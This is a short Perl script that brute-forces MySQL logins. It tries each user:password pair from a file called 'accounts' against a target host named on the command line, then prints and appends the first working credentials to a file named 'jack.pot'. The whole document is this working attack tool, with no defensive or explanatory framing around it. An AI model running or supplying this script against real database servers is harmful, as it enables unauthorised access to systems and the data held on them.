use DBI();
$target = $ARGV[0];
open FILE, "accounts";
while(<FILE>) {
        chomp;
        @a = split(":", $_);
        $user = $a[0];
        $password = $a[1];
        my $dbh = DBI->connect("DBI:mysql:host=$target;",
                               "$user", "$password",
                               {'RaiseError' => 0, PrintError => 0}) || next;
        printf "\nSUCCESS $target $user:$password\n";
        open LOG, ">>jack.pot";
        print LOG "SUCCESS $target $user:$password\n\n";
        close LOG;
        exit;
}
close FILE;
exit;

